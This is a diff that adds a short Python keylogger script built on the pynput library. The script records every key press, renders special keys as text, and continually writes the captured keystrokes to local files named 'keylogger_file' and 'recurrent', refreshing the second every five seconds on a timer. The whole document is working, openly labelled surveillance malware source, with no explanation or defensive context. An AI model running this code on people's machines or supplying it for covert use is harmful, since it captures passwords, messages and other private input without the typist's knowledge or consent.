@@ -1,0 +1,33 @@
+#!/usr/bin/python3
+import pynput.keyboard
+import threading 
+
+string = ""
+
+def press_keys(key):
+        global string
+        try:
+                string=string+str(key.char)
+        except AttributeError:
+                if key == key.space:
+                        string = string +" "
+                elif key ==key.tab:
+                        string=string+"/t"
+                elif key == key.ctrl or key==key.backspace or key==key.shift or key==key.alt:
+                        string =string
+                else:
+                        string=string+str(key)
+        with open("keylogger_file","w") as obj:
+                obj.write(string)
+
+def recurrent():
+        with open("recurrent","w") as obj:
+                obj.write(string)
+                obj.close()
+        timer = threading.Timer(5, recurrent)
+        timer.start()
+keyboard_listener = pynput.keyboard.Listener(on_press=press_keys)
+
+with keyboard_listener:
+        recurrent()
+        keyboard_listener.join()
